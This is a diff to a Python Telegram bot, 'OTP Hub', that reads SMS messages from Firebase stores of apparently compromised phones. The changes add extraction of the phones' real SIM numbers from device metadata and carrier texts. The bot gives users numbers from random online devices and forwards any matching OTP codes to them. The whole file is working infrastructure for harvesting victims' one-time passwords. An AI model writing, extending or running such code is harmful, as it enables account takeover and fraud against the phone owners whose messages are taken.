@@ -25,38 +25,27 @@ router = Router()
 def load_data():
     if not os.path.exists(DATA_FILE):
         default_data = {
-            "owner_id": OWNER_ID,
-            "admins": [],
-            "firebases": [], # {"url": "...", "auth": "...", "label": "..."}
-            "users": {},
-            "free_mode": True,
-            "user_leases": {}, 
-            "user_history": {},
-            "stats": {"total_otps": 0}
+            "owner_id": OWNER_ID, "admins": [], "firebases": [], "users": {},
+            "free_mode": True, "user_leases": {}, "user_history": {}, "stats": {"total_otps": 0}
         }
-        with open(DATA_FILE, "w") as f:
-            json.dump(default_data, f, indent=4)
+        with open(DATA_FILE, "w") as f: json.dump(default_data, f, indent=4)
         return default_data
-    with open(DATA_FILE, "r") as f:
-        return json.load(f)
+    with open(DATA_FILE, "r") as f: return json.load(f)
 
 def save_data(data):
-    with open(DATA_FILE, "w") as f:
-        json.dump(data, f, indent=4)
+    with open(DATA_FILE, "w") as f: json.dump(data, f, indent=4)
 
 def clean_old_history(data):
     now = time.time()
     for uid in list(data["user_history"].keys()):
         data["user_history"][uid] = {k: v for k, v in data["user_history"][uid].items() if now - v < 86400}
-        if not data["user_history"][uid]:
-            del data["user_history"][uid]
+        if not data["user_history"][uid]: del data["user_history"][uid]
     return data
 
 # ================= FIREBASE HELPERS =================
 async def fetch_fb(url, auth=None):
     full_url = url
-    if auth:
-        full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
+    if auth: full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(full_url, timeout=10) as resp:
@@ -64,8 +53,7 @@ async def fetch_fb(url, auth=None):
                     txt = await resp.text()
                     if txt == "null" or not txt: return {}
                     return json.loads(txt)
-    except Exception:
-        pass
+    except Exception: pass
     return None
 
 def decode_panel_url(panel_url):
@@ -75,64 +63,81 @@ def decode_panel_url(panel_url):
     try:
         b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
         decoded = base64.b64decode(b64_str).decode('utf-8')
-        if "|||" in decoded:
-            return decoded.split("|||")[0], ""
+        if "|||" in decoded: return decoded.split("|||")[0], ""
         try:
             data = json.loads(decoded)
-            if isinstance(data, dict) and "url" in data:
-                return data["url"], data.get("key", "")
+            if isinstance(data, dict) and "url" in data: return data["url"], data.get("key", "")
         except json.JSONDecodeError:
-            if decoded.startswith("http"):
-                return decoded, ""
-    except Exception:
-        pass
+            if decoded.startswith("http"): return decoded, ""
+    except Exception: pass
     return None
 
-def extract_numbers(msgs):
+def extract_real_sim_numbers(dev_data, msgs):
     nums = set()
-    pattern = re.compile(r'(?:\+?91|0)?([6-9]\d{9})')
+    
+    # 1. Direct fields in device metadata
+    for key in ["phoneNumber", "phone", "number", "mobile"]:
+        if dev_data.get(key):
+            n = re.sub(r'\D', '', str(dev_data[key]))
+            if len(n) >= 10: nums.add(n[-10:])
+            
+    # 2. Sims array
+    sims = dev_data.get("sims")
+    if isinstance(sims, list):
+        for sim in sims:
+            if isinstance(sim, dict):
+                for key in ["phoneNumber", "number", "phone"]:
+                    if sim.get(key):
+                        n = re.sub(r'\D', '', str(sim[key]))
+                        if len(n) >= 10: nums.add(n[-10:])
+
+    # 3. Strict Regex in Messages (Jio/Airtel/Number specific)
+    strict_patterns = [
+        r'(?:Jio number|Airtel number|Vi number|BSNL number|your number is|registered with mobile number|mobile number)[^\d]*([6-9]\d{9})',
+        r'(?:Jio|Airtel|Vi|BSNL)[^\d]*([6-9]\d{9})'
+    ]
+    
     for m in msgs:
         text = m.get("message", "")
-        for match in pattern.findall(text):
-            nums.add(match)
+        for pattern in strict_patterns:
+            matches = re.findall(pattern, text, re.IGNORECASE)
+            for match in matches:
+                nums.add(match)
+                
+    # Fallback to general pattern but filter out known bad ones (like 9264092640 PNB)
+    general_pattern = re.compile(r'\b[6-9]\d{9}\b')
+    bad_numbers = {"9264092640", "6000171117", "9250905292"} # Add more if needed
+    
+    for m in msgs:
+        text = m.get("message", "")
+        # Only look at messages with keywords
+        if any(k in text.lower() for k in ["jio", "airtel", "sim", "otp", "verification", "login"]):
+            for match in general_pattern.findall(text):
+                if match not in bad_numbers:
+                    nums.add(match)
+
     return list(nums)
 
 def extract_otp(text):
-    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]):
-        return None
+    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]): return None
     match = re.search(r'\b(\d{4,8})\b', text)
     return match.group(1) if match else None
 
 def extract_service_name(text, sender):
     text_lower = text.lower()
-    known_services = {
-        "whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram",
-        "telegram": "Telegram", "google": "Google", "amazon": "Amazon",
-        "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato",
-        "paytm": "Paytm", "phonepe": "PhonePe", "creditt": "Creditt",
-        "ram fincorp": "Ram Fincorp", "jio": "Jio", "airtel": "Airtel"
-    }
-    for key, name in known_services.items():
-        if key in text_lower:
-            return name
+    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel"}
+    for key, name in services.items():
+        if key in text_lower: return name
     if sender:
         parts = sender.split("-")
-        if len(parts) > 1:
-            return parts[1]
-    return "Unknown Service"
-
-# ================= STATES =================
-class AdminStates(StatesGroup):
-    select_country_add = State()
-    add_fb = State()
+        if len(parts) > 1: return parts[1]
+    return "Unknown"
 
 # ================= CORE FUNCTIONS =================
 async def get_owner_stats():
     data = load_data()
     fbs = data.get("firebases", [])
-    total_devices = 0
-    online_devices = 0
-    fb_stats = {}
+    total_devices, online_devices, fb_stats = 0, 0, {}
     
     for fb in fbs:
         clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
@@ -150,9 +155,8 @@ async def get_owner_stats():
         fb_stats[label]["online"] += fb_online
 
     return {
-        "total_fbs": len(fbs), "total_devices": total_devices,
-        "online_devices": online_devices, "total_users": len(data.get("users", {})),
-        "total_otps": data.get("stats", {}).get("total_otps", 0),
+        "total_fbs": len(fbs), "total_devices": total_devices, "online_devices": online_devices,
+        "total_users": len(data.get("users", {})), "total_otps": data.get("stats", {}).get("total_otps", 0),
         "fb_stats": fb_stats
     }
 
@@ -172,24 +176,20 @@ async def get_numbers_for_country(country_label, uid):
                 if isinstance(dev_data, dict) and dev_data.get("status") is True:
                     online_devices.append((fb, dev_id, dev_data))
 
-    if not online_devices:
-        return None, None, []
+    if not online_devices: return None, None, []
 
     # Pick ONE random device
     selected_fb, selected_dev_id, dev_data = random.choice(online_devices)
     battery = dev_data.get("battery", "?")
     
-    # Fetch messages to find real numbers
-    url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=50"
+    # Fetch messages
+    url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=100"
     msgs_dict = await fetch_fb(url, selected_fb.get("auth"))
+    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
     
-    msgs = []
-    if msgs_dict:
-        for k, v in msgs_dict.items():
-            if isinstance(v, dict) and v.get("type") == "incoming":
-                msgs.append(v)
+    # Extract real numbers
+    numbers = extract_real_sim_numbers(dev_data, msgs)
     
-    numbers = extract_numbers(msgs)
     user_hist = data.get("user_history", {}).get(str(uid), {})
     available = [n for n in numbers if n not in user_hist]
     random.shuffle(available)
@@ -200,7 +200,6 @@ async def get_latest_messages_for_fb(fb_url, auth):
     all_msgs = {}
     clients = await fetch_fb(f"{fb_url}/clients.json", auth)
     if not clients: return all_msgs
-    
     for dev_id in clients.keys():
         msgs = await fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
         if msgs:
@@ -247,7 +246,7 @@ async def background_global_scanner(main_bot: Bot):
                             text_content = msg.get("message", "")
                             otp = extract_otp(text_content)
                             if otp:
-                                found_nums = re.findall(r'(?:\+?91|0)?([6-9]\d{9})', text_content)
+                                found_nums = re.findall(r'\b[6-9]\d{9}\b', text_content)
                                 target_numbers = [re.sub(r'\D', '', n)[-10:] for n in found_nums]
                                 
                                 for num, users in number_to_users.items():
@@ -267,13 +266,11 @@ async def background_global_scanner(main_bot: Bot):
                                             try:
                                                 await main_bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
                                                 otps_sent += 1
-                                            except Exception:
-                                                pass
+                                            except Exception: pass
             if otps_sent > 0:
                 d = load_data()
                 d.setdefault("stats", {})["total_otps"] = d.get("stats", {}).get("total_otps", 0) + otps_sent
                 save_data(d)
-                
             await asyncio.sleep(5)
         except Exception as e:
             log.error(f"Scanner Error: {e}")
@@ -309,7 +306,6 @@ def admin_kb():
 async def cmd_start(msg: Message):
     data = load_data()
     uid = msg.from_user.id
-    
     if str(uid) not in data["users"]:
         data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time())}
         save_data(data)
@@ -319,9 +315,7 @@ async def cmd_start(msg: Message):
         except TelegramBadRequest: pass
         await admin_home_msg(msg)
     else:
-        if not data.get("free_mode", True):
-            await msg.answer("⛔ Access Denied.")
-            return
+        if not data.get("free_mode", True): return await msg.answer("⛔ Access Denied.")
         await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
 
 async def admin_home_msg(msg: Message):
@@ -337,7 +331,6 @@ async def admin_home_msg(msg: Message):
     )
     for label, fstats in stats["fb_stats"].items():
         text += f"🌍 {label}: {fstats['online']} ONLINE / {fstats['total']} Total\n"
-        
     try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
     except TelegramBadRequest: pass
 
@@ -359,43 +352,11 @@ async def admin_home_cb(cq: CallbackQuery):
     try: await cq.message.edit_text(text, reply_markup=admin_kb(), parse_mode="HTML")
     except TelegramBadRequest: pass
 
-@router.callback_query(F.data == "admin:addurl")
-async def admin_addurl_start(cq: CallbackQuery, state: FSMContext):
-    await state.set_state(AdminStates.select_country_add)
-    await cq.message.edit_text("🌍 Enter the Country Name (e.g., `Sri Lanka`):", parse_mode="Markdown")
-
-@router.message(AdminStates.select_country_add)
-async def admin_select_country(msg: Message, state: FSMContext):
-    await state.update_data(country_label=msg.text.strip())
-    await state.set_state(AdminStates.add_fb)
-    await msg.answer(f"Now send the URL for <b>{msg.text.strip()}</b>:\n\nFormat: `URL` or `Panel URL`", parse_mode="HTML")
-
-@router.message(AdminStates.add_fb)
-async def admin_addurl_done(msg: Message, state: FSMContext):
-    data_fsm = await state.get_data()
-    label = data_fsm.get("country_label", "Unknown")
-    await state.clear()
-    
-    text = msg.text.strip()
-    final_url, auth = text, ""
-    
-    if "#DARKs=" in text or "?s=" in text:
-        decoded = decode_panel_url(text)
-        if decoded: final_url, auth = decoded
-        else: return await msg.answer("❌ Could not decode Panel URL.")
-
-    data = load_data()
-    data["firebases"].append({"url": final_url, "auth": auth, "label": label})
-    save_data(data)
-    try: await msg.answer(f"✅ URL added successfully for <b>{label}</b>!", reply_markup=admin_kb(), parse_mode="HTML")
-    except TelegramBadRequest: pass
-
 @router.callback_query(F.data == "admin:manage_fb")
 async def admin_manage_fb(cq: CallbackQuery):
     data = load_data()
     fbs = data.get("firebases", [])
-    if not fbs:
-        return await cq.message.edit_text("No firebases added yet.", reply_markup=admin_kb())
+    if not fbs: return await cq.message.edit_text("No firebases added yet.", reply_markup=admin_kb())
     
     kb = []
     for fb in fbs:
@@ -413,8 +374,7 @@ async def admin_viewfb(cq: CallbackQuery):
     if not fb: return await cq.answer("URL not found!")
     
     clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
-    if not clients:
-        return await cq.message.edit_text("❌ No devices found or error fetching.", reply_markup=admin_kb())
+    if not clients: return await cq.message.edit_text("❌ No devices found or error fetching.", reply_markup=admin_kb())
     
     text = f"📁 <b>Firebase:</b> {fb['label']}\n🔗 <code>{fb['url']}</code>\n\n"
     count = 0
@@ -424,7 +384,7 @@ async def admin_viewfb(cq: CallbackQuery):
             battery = dev_info.get("battery", "?")
             text += f"🆔 <code>{dev_id}</code>\n{status} | 🔋 {battery}\n\n"
             count += 1
-            if count >= 20: # Limit
+            if count >= 20: 
                 text += f"...and more devices."
                 break
     
@@ -500,10 +460,8 @@ async def user_account(cq: CallbackQuery):
 async def main():
     log.info("Bot Started!")
     await web_server() 
-    
     main_bot = Bot(token=BOT_TOKEN)
     asyncio.create_task(background_global_scanner(main_bot))
-    
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
     await dp.start_polling(main_bot)
